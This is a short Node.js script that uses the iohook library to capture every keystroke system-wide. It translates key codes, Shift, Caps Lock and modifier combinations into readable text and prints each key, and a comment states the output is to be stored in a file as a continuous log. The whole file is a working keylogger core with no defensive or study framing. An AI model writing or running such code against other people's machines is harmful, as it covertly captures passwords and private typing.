const iohook = require('iohook');
const config = require('./config')

const keymap = config.keymap;
const specialchar = {"`":"~","1":"!","2":"@","3":"#","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(","0":")","-":"_","=":"+","[":"{","]":"}","\\":"|",";":":","'":'"',",":"<",".":">","/":"?",}

let toggle = false;

function interpret(event) {

    if (event.rawcode == 20) {
        toggle = !toggle;
    } 
    else {
        if (event.rawcode in keymap) {
            let i = keymap[event.rawcode];
            if(event.altKey || event.ctrlKey|| event.metaKey){
                if(event.shiftKey)
                i="SHIFT+"+i;
                if(event.altKey)
                i="ALT+"+i;
                if(event.metaKey)
                i="WIN+"+i;
                if(event.ctrlKey)
                i="CTRL+"+i;
            }
            else if(event.shiftKey && (i in specialchar)){
                i=specialchar[i]
            }
            else if (toggle ^ event.shiftKey) {
                i = i.toUpperCase();
            }

            if (i) {
                if (i.length > 1) {
                    i = (`#[ ${i} ]#`);
                }
                console.log(i);
                //$$$$$$$$$$$$$$$$$$ variable 'i' is to be stored in a file without linebreak $$$$$$$$$$$$$$$$$$$$$$
            }
        }
    }
}

iohook.on('keydown',interpret);

iohook.start();